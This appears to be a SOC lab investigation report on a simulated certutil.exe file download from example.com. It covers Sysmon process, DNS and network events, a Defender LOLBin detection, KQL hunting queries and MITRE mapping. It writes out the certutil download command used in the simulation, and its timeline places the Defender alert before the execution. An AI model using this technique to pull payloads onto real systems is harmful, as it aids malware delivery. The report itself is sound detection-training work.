# Investigation Report — INV-0012

## Title

File Download Attempt Using `certutil.exe`

---

## Date

2026-07-28

---

## Lab Environment

- **SIEM:** Elastic Security
- **Endpoint:** Windows 10 Pro
- **Host:** DESKTOP-0DFKSAT
- **Log Sources:**
  - Sysmon Operational
  - Microsoft Defender
- **Provider:**
  - Microsoft-Windows-Sysmon
  - Microsoft Defender Antivirus

---

## Objective

Investigate the use of the native Windows utility **certutil.exe** to retrieve a remote file over HTTPS, determine whether the download succeeded, and correlate process execution, DNS activity, network connections, and Microsoft Defender detections.

---

## Summary

User **gamal** attempted to download a remote file using the native Windows utility **certutil.exe**.

Sysmon captured the execution of **certutil.exe**, including the complete command line used to retrieve content from **https://example.com**.

Further investigation confirmed that the system successfully resolved the domain name and established an outbound HTTPS connection to the remote server.

Microsoft Defender immediately detected the command as suspicious because **certutil.exe** is commonly abused by attackers as a Living-off-the-Land Binary (LOLBin) for malware delivery.

Although the command completed successfully and network communication occurred, **no output file was written to disk**. Manual verification of the destination directory confirmed that the expected file (`example.html`) was not downloaded.

The activity was performed intentionally inside a controlled laboratory environment for detection and investigation purposes.

---

# Evidence

| Field | Value |
|--------|-------|
| User | gamal |
| Host | DESKTOP-0DFKSAT |
| Executed Process | certutil.exe |
| Parent Process | powershell.exe |
| Destination URL | https://example.com |
| Output File | example.html |
| DNS Query | example.com |
| Destination IP | 104.20.23.154 |
| Protocol | HTTPS (TCP/443) |
| Microsoft Defender | Trojan:Win32/Ceprolad.A |
| File Download | Not Written to Disk |

---

# Attack Simulation

The following command was executed from an elevated PowerShell session.

```cmd
certutil.exe -urlcache -split -f https://example.com "%USERPROFILE%\Desktop\SOCLab\example.html"
```

### Command Explanation

| Argument | Description |
|----------|-------------|
| `certutil.exe` | Native Windows Certificate Utility (LOLBin). |
| `-urlcache` | Downloads content using the Windows URL cache. |
| `-split` | Splits downloaded content into separate cache objects when necessary. |
| `-f` | Forces the download even if the object already exists. |
| `https://example.com` | Remote resource requested. |
| `example.html` | Intended output file. |

---

# KQL Queries Used

## Locate Process Execution

```kql
event.dataset:"windows.sysmon_operational"
and process.name:"certutil.exe"
```

---

## Locate DNS Query

```kql
event.dataset:"windows.sysmon_operational"
and event.code:22
and dns.question.name:"example.com"
```

---

## Locate Network Connection

```kql
event.dataset:"windows.sysmon_operational"
and event.code:3
and process.name:"certutil.exe"
```

---

## Search Using Process Entity ID

```kql
process.entity_id:"<Process Entity ID>"
```

---

## Search Using Output File Name

```kql
example.html
```

---

## Search Microsoft Defender Detection

```kql
message:*Ceprolad*
```

---

# Timeline

| Time | Activity |
|------|----------|
| 14:47:28 | User executed `certutil.exe` |
| 14:47:29 | Sysmon Event ID 1 recorded process creation |
| 14:47:29 | Sysmon Event ID 22 recorded successful DNS resolution |
| 14:47:29 | Sysmon Event ID 3 recorded outbound HTTPS connection |
| 14:40:44 | Microsoft Defender detected suspicious LOLBin activity |
| 14:47 | Destination folder inspected |
| 14:47 | Expected file was not present |

---

# Investigation

The investigation began after identifying the execution of **certutil.exe** in Sysmon Process Creation events.

The captured command line showed that user **gamal** attempted to download content from **https://example.com** and save it as **example.html** inside the **SOCLab** directory.

Further investigation identified **Sysmon Event ID 22**, confirming successful DNS resolution for **example.com**.

Correlation with **Sysmon Event ID 3** showed that **certutil.exe** successfully established an outbound HTTPS connection over TCP port **443** to the destination IP address.

The destination IP address was analyzed using VirusTotal and showed no malicious reputation, indicating that the remote server itself was considered clean.

During execution, **Microsoft Defender** generated a **High Severity** detection identifying the activity as **Trojan:Win32/Ceprolad.A**. The alert was triggered because attackers frequently abuse **certutil.exe** as a Living-off-the-Land Binary (LOLBin) to retrieve malicious payloads.

Following the network activity, the destination directory was manually inspected.

Although the command reported successful completion, the expected output file **example.html** was **not written to disk**.

The investigation therefore confirmed that process execution, DNS resolution, and network communication occurred successfully, while the intended file download did not result in a saved file.

---

# Analysis

This investigation demonstrates how attackers may abuse legitimate Windows utilities to retrieve remote payloads without introducing third-party tools.

The reconstructed execution flow is shown below.

```text
PowerShell
        │
        ▼
certutil.exe
(Process Creation)
        │
        ▼
DNS Resolution
(Sysmon Event ID 22)
        │
        ▼
HTTPS Connection
(Sysmon Event ID 3)
        │
        ▼
Microsoft Defender Detection
        │
        ▼
Destination Folder Inspection
(No File Written)
```

Although no payload was successfully written to disk, the behavior remains highly valuable from a detection engineering perspective.

An analyst can reconstruct the complete activity by correlating:

- Process Creation (Event ID 1)
- DNS Query (Event ID 22)
- Network Connection (Event ID 3)
- Microsoft Defender Detection
- VirusTotal Reputation Analysis
- Manual File System Verification

This investigation also highlights that successful network communication does not necessarily indicate a successful file download.

---

# Verdict

**Classification:** Benign (Lab Simulation)

**Confidence:** High

**Escalation Required:** No

---

# MITRE ATT&CK

| Technique | Description |
|------------|-------------|
| T1105 | Ingress Tool Transfer |
| T1218 | System Binary Proxy Execution |
| T1218.010 | Signed Binary Proxy Execution: Certutil |

---

# Lessons Learned

- Investigated the execution of **certutil.exe**.
- Correlated Process Creation, DNS, and Network Connection events.
- Observed Microsoft Defender detection of LOLBin abuse.
- Verified the destination IP reputation using VirusTotal.
- Confirmed that no output file was written to disk.
- Reinforced the importance of correlating multiple telemetry sources during investigations.
